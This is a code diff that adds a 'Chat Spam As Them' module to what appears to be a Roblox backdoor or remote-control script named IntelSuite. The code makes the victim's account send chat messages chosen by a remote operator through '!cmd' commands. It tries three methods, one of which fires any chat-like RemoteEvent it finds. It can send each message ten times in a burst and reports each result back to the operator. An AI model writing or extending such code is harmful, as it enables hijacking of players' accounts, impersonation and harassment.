@@ -1469,3 +1469,67 @@ end
 getgenv().IntelSuite.StartKillLoop = startKillLoop
 getgenv().IntelSuite.StopKillLoop = stopKillLoop
 
+-- ============================================================
+-- MODULE 22: Chat Spam As Them
+-- Sends chat messages AS the victim using the chat remote
+-- !cmd chatas:<message> — sends that message as them
+-- !cmd chatspam:<message> — sends it 10 times rapidly
+-- ============================================================
+local function chatAs(message)
+    local success = false
+
+    -- Method 1: TextChatService (new chat)
+    pcall(function()
+        local TextChatService = game:GetService("TextChatService")
+        local channel = TextChatService:FindFirstChild("TextChannels")
+        if channel then
+            local general = channel:FindFirstChild("RBXGeneral")
+            if general then
+                general:SendAsync(message)
+                success = true
+            end
+        end
+    end)
+
+    -- Method 2: Legacy chat remote
+    if not success then
+        pcall(function()
+            local remote = game:GetService("ReplicatedStorage"):FindFirstChild("DefaultChatSystemChatEvents", true)
+            if remote then
+                local sayMsg = remote:FindFirstChild("SayMessageRequest")
+                if sayMsg then
+                    sayMsg:FireServer(message, "All")
+                    success = true
+                end
+            end
+        end)
+    end
+
+    -- Method 3: Direct chat fire
+    if not success then
+        pcall(function()
+            local repStorage = game:GetService("ReplicatedStorage")
+            for _, v in ipairs(repStorage:GetDescendants()) do
+                if v:IsA("RemoteEvent") and (v.Name:lower():find("chat") or v.Name:lower():find("say") or v.Name:lower():find("message")) then
+                    pcall(function() v:FireServer(message) end)
+                end
+            end
+        end)
+    end
+
+    send("CHAT AS VICTIM", "**User:** " .. LocalPlayer.Name .. "\n**Message sent:** " .. tostring(message) .. "\n**Success:** " .. tostring(success), 16753920)
+end
+
+local function chatSpam(message)
+    send("CHAT SPAM STARTED", "**User:** " .. LocalPlayer.Name .. "\n**Message:** " .. tostring(message) .. "\n**Sending 10 times...**", 16753920)
+    task.spawn(function()
+        for i = 1, 10 do
+            chatAs(message)
+            task.wait(0.5)
+        end
+    end)
+end
+
+getgenv().IntelSuite.ChatAs = chatAs
+getgenv().IntelSuite.ChatSpam = chatSpam
+
